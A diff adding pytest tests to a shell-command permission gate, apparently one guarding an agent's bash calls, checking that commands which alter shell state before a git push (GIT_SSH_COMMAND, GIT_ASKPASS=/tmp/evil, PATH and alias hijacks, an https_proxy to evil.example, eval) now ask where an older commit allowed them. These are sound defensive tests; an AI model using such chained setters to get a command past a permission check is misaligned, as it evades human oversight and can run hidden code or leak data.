@@ -259,6 +259,86 @@ def test_an_ask_rule_after_an_allow_rule_that_misses_still_sees_the_whole_line()
     assert outcome(line, p) == "ask"
 
 
+# --- a command that changes the shell for the commands after it -----------------------------------------------------
+# Each first command is allowed alone, and a bash call starts a fresh shell, so only a later command on the same line
+# sees the change. Each line was allowed at f7663da under an allow rule for the push alone, and asks on main.
+
+SETTERS = [
+    f'export GIT_SSH_COMMAND="$(cat /tmp/cmd)"; {PUSH}',        # the push runs whatever is in /tmp/cmd
+    f"export GIT_SSH_COMMAND=$X; {PUSH}",
+    f"hash -p /tmp/evil git; {PUSH}",
+    f"export GIT_ASKPASS=/tmp/evil; {PUSH}",
+    f"export SSH_ASKPASS=/tmp/evil SSH_ASKPASS_REQUIRE=force; {PUSH}",
+    f"export GIT_WORK_TREE=/tmp/x GIT_DIR=/tmp/x/.git; {PUSH}",
+    f"export https_proxy=http://evil.example:8080; {PUSH}",
+    f"https_proxy=http://evil.example:8080; export https_proxy; {PUSH}",
+    f"set -a; GIT_DIR=/tmp/x/.git; {PUSH}",
+]
+
+
+@pytest.mark.parametrize("line", SETTERS)
+def test_a_command_that_sets_shell_state_must_be_named_too(line):
+    assert outcome(line, pol(ANCHORED)) == "ask"                                   # f7663da: allow
+
+
+@pytest.mark.parametrize("line", [f"shopt -s expand_aliases\nalias git='rm -rf build'\n{PUSH}",
+                                  f"export PATH=/tmp/evil:$PATH; {PUSH}",
+                                  f"read -r HOME < /tmp/home; {PUSH}",
+                                  f"for PATH in /tmp/evil; do {PUSH}; done",
+                                  f"source ./env.sh; {PUSH}",
+                                  f"enable -f /tmp/evil.so git; {PUSH}"])
+def test_a_command_that_sets_shell_state_must_be_named_with_opaque_code_allowed(line):
+    assert outcome(line, pol(ANCHORED, categories=OPAQUE_OK)) == "ask"             # f7663da: allow
+
+
+def test_a_prefix_assignment_belongs_to_the_command_s_own_text():
+    assert outcome(f"GIT_ASKPASS=/tmp/evil {PUSH}", pol(ANCHORED)) == "ask"
+    assert outcome(f"cd repo && GIT_ASKPASS=/tmp/evil {PUSH}", pol(ANCHORED)) == "ask"
+
+
+def test_a_rule_that_names_the_setter_too_decides_the_line():
+    line = f"export GIT_DIR=/tmp/x/.git; {PUSH}"
+    assert outcome(line, pol(rule([f"^{PUSH}$", r"^export GIT_DIR=/tmp/x/\.git$"]))) == "allow"
+    assert sh(line).setters == ["export GIT_DIR=/tmp/x/.git"]
+    assert "setters" not in sh(line).as_dict()
+
+
+@pytest.mark.parametrize("line, sets", [
+    ("X=1", True), ("X=1 Y=2", True), ("export X=1", True), ("export X", True), ("export -p", False),
+    ("declare -p X", True), ("declare -f", False), ("readonly X=1", True), ("local X", True),
+    ("typeset -x X", True), ("command export X=1", True), ("builtin hash -p /x git", True),
+    ("set -e", False), ("set -euo pipefail", False), ("set -x", False), ("set -a", True), ("set -ea", True),
+    ("set -o allexport", True), ("set -eo allexport", True), ("set -k", True), ("set -- a b", True),
+    ("set $OPTS", True), ("shopt -s expand_aliases", True), ("shopt -q extglob", False), ("shopt", False),
+    ("hash", False), ("hash git", True), ("alias", False), ("alias g=git", True), ("enable -n echo", True),
+    ("unset GIT_DIR", True), ("unset -f git", True), ("trap 'rm -f x' EXIT", True), ("trap", False),
+    ("source ./env.sh", True), (". ./env.sh", True), ("eval x", False), ("read -r line", True),
+    ("mapfile -t a", True), ("printf -v X %s y", True), ("printf %s y", False), ("let x=1", True),
+    ("getopts ab o", True), ("pushd /tmp", True), ("popd", True), ("exec 3>/tmp/f", True),
+    ("exec git status", False), ("$CMD x", True), ("for x in a b", True), ("function f", True),
+    ("cd repo", False), ("ls -la", False), ("git status", False), ("GIT_DIR=x git status", False),
+    ("env X=1 git status", False), ("echo export X=1", False),
+])
+def test_which_commands_change_the_shell_for_later_commands(line, sets):
+    (k,) = gate._parse(line)[0]
+    assert gate._sets_state(k) is sets
+
+
+def test_eval_text_is_read_for_setters_as_a_nested_line():
+    line = f"eval 'export GIT_DIR=/tmp/x/.git'; {PUSH}"
+    assert sh(line).setters == []
+    assert "export GIT_DIR=/tmp/x/.git" in [t for p in gate._each_part(sh(line)) for t in p.setters]
+    assert outcome(line, pol(ANCHORED, categories=OPAQUE_OK)) == "ask"             # f7663da: allow
+    assert outcome(f'eval "$X"; {PUSH}', pol(ANCHORED, categories=OPAQUE_OK)) == "ask"
+    assert outcome(f"true; eval '{PUSH}'", pol(ANCHORED, categories=OPAQUE_OK)) == "allow"
+
+
+def test_a_function_definition_is_a_setter_with_no_own_text():
+    line = f"git() {{ echo hi; }}; {PUSH}"
+    assert None in sh(line).setters
+    assert outcome(line, pol(rule(".*"), categories=OPAQUE_OK)) == "ask"           # f7663da: allow
+
+
 # --- a log rule that only raises the line ---------------------------------------------------------------------------
 
 @pytest.mark.parametrize("line", ["ls && cat README.md", "ls -la $(pwd)/src", "ls | grep x", "ls -la; cat foo",
